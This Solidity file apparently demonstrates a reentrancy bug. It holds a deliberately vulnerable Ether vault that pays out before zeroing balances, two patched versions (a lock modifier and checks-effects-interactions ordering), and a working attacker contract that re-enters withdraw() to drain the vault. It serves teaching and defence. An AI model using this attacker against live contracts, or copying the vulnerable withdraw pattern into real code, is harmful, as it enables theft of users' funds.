// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract VulnerableEtherVault {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public virtual{
        uint256 amount = balances[msg.sender];
        require(amount > 0, "nothing to withdraw");

        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "send failed");

        balances[msg.sender] = 0;
    }

    function vaultBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract PatchedEtherVaultModifier is VulnerableEtherVault {
    bool private locked;

    modifier nonReentrant() {
        require(!locked, "reentrant call");
        locked = true;
        _;
        locked = false;
    }

    function withdraw() public override nonReentrant {
        super.withdraw();
    }
}

contract PatchedEtherVaultCEIPattern is VulnerableEtherVault {
    function withdraw() public override {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "nothing to withdraw");

        balances[msg.sender] = 0;

        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "send failed");
    }
}

contract ReentrancyAttacker {
    VulnerableEtherVault public immutable TARGET;
    uint256 public attackAmount;

    constructor(address targetAddress) {
        TARGET = VulnerableEtherVault(targetAddress);
    }

    function attack() external payable {
        require(msg.value > 0, "seed required");
        attackAmount = msg.value;
        TARGET.deposit{value: msg.value}();
        TARGET.withdraw();
    }

    receive() external payable {
        if (address(TARGET).balance >= attackAmount) {
            TARGET.withdraw();
        }
    }
}
